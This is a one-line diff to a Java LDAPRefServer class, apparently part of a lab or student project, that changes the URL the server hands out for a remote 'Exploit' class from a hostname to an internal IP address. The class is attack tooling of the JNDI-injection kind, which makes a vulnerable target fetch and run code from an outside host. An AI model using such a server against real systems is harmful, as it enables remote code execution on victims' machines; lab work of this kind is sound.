@@ -49,7 +49,7 @@ public class LDAPRefServer extends Thread {
 
 	private static final String LDAP_BASE = "dc=example,dc=com";
 	private static final Integer PORT = 389;
-	private static final String LDAP_PATH_TO_EXPLOIT = "http://scl-fyp-infra-forwarder:8083/#Exploit";
+	private static final String LDAP_PATH_TO_EXPLOIT = "http://172.20.0.2:8083/#Exploit";
 
 	@Override
 	public void run() {
